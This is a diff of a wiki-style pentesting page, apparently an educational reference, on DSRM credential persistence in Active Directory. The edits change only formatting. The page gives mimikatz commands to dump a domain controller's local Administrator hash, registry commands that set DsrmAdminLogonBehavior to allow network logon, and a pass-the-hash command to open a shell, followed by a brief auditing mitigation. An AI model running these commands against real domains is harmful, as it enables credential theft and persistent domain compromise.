@@ -2,8 +2,8 @@
 
 ## DSRM Credentials
 
-There is a **local administrator** account inside each **DC**. Having admin privileges in this machine you can use mimikatz to **dump the local Administrator hash**. Then, modifying a registry to **activate this password** so you can remotely access to this local Administrator user.  
-First we need to **dump** the **hash** of the **local Administrator** user inside the DC:
+There is a **local administrator** account inside each **DC**. Having admin privileges in this machine you can use mimikatz to **dump the local Administrator hash**. Then, modifying a registry to **activate this password **so you can remotely access to this local Administrator user.\
+First we need to **dump **the **hash **of the **local Administrator **user inside the DC:
 
 ```bash
 Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
@@ -17,7 +17,7 @@ New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLog
 Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2  #Change value to "2"
 ```
 
-Then, using a PTH you can **list the content of C$ or even obtain a shell**. Notice that for creating a new powershell session with that hash in memory \(for the PTH\) **the "domain" used is just the name of the DC machine:**
+Then, using a PTH you can **list the content of C$ or even obtain a shell**. Notice that for creating a new powershell session with that hash in memory (for the PTH) **the "domain" used is just the name of the DC machine:**
 
 ```bash
 sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe
@@ -30,4 +30,3 @@ More info about this in: [https://adsecurity.org/?p=1714](https://adsecurity.org
 ### Mitigation
 
 * Event ID 4657 - Audit creation/change of `HKLM:\System\CurrentControlSet\Control\Lsa DsrmAdminLogonBehavior`
-
